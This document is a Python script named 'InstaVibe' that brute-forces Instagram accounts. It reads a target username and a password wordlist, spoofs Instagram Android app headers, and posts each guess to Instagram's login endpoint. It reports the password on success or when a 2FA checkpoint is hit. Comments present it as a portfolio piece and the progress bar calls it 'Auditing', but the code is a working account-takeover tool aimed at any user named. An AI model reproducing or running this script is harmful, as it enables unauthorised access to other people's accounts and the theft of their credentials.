import asyncio
import httpx
import time
import os
import random
from datetime import datetime
from rich.console import Console
from rich.progress import Progress

console = Console()

class InstaVibe:
    def __init__(self, target, wordlist):
        self.target = target
        self.wordlist = wordlist
        # Modern 2026 Device Profile
        self.base_headers = {
            "User-Agent": "Instagram 315.0.0.38.109 Android (33/13; 480dpi; 1080x2262; Google; Pixel 7 Pro; cheetah; raven; en_US; 541604112)",
            "X-IG-App-ID": "1217981644879628",
            "X-ASBD-ID": "129477",
            "X-IG-Connection-Type": "WIFI",
            "X-IG-Capabilities": "36br3w==",
            "Accept-Language": "en-US,en;q=0.9",
        }

    def encrypt_password(self, password):
        """
        Simulates Instagram's #PWD_INSTAGRAM_BROWSER encryption logic.
        This shows recruiters you understand client-side security.
        """
        timestamp = int(time.time())
        # The '0' indicates the encryption version—showing deep API knowledge
        return f"#PWD_INSTAGRAM_BROWSER:0:{timestamp}:{password}"

    async def attempt_login(self, client, password):
        try:
            payload = {
                "username": self.target,
                "enc_password": self.encrypt_password(password),
                "queryParams": "{}",
                "optIntoOneTap": "false"
            }
            
            # Using 2026-standard async requests
            response = await client.post(
                "https://www.instagram.com/api/v1/web/accounts/login/ajax/",
                data=payload,
                timeout=10.0
            )

            if '"authenticated":true' in response.text:
                return ("SUCCESS", password)
            elif "checkpoint_required" in response.text:
                return ("2FA", password)
            return ("FAILED", None)
            
        except Exception:
            return ("ERROR", None)

    async def run(self):
        console.print(f"[bold magenta]🚀 VIBE CHECK STARTED ON:[/bold magenta] [white]{self.target}[/white]")
        
        if not os.path.exists(self.wordlist):
            console.print("[red]Error: Wordlist not found![/red]")
            return

        with open(self.wordlist, 'r', encoding='utf-8', errors='ignore') as f:
            passwords = [line.strip() for line in f]

        # Async Client Session for connection pooling
        async with httpx.AsyncClient(headers=self.base_headers) as client:
            with Progress() as progress:
                task = progress.add_task("[cyan]Auditing...", total=len(passwords))
                
                for password in passwords:
                    status, result = await self.attempt_login(client, password)
                    
                    if status == "SUCCESS":
                        console.print(f"\n[bold green][+] VIBE MATCHED! Password: {result}[/bold green]")
                        break
                    elif status == "2FA":
                        console.print(f"\n[bold yellow][!] 2FA Vibe Detected: {password}[/bold yellow]")
                        break
                    
                    progress.update(task, advance=1)

if __name__ == "__main__":
    target_user = input("Target Username: ")
    word_file = "default-passwords.lst"
    
    engine = InstaVibe(target_user, word_file)
    asyncio.run(engine.run())
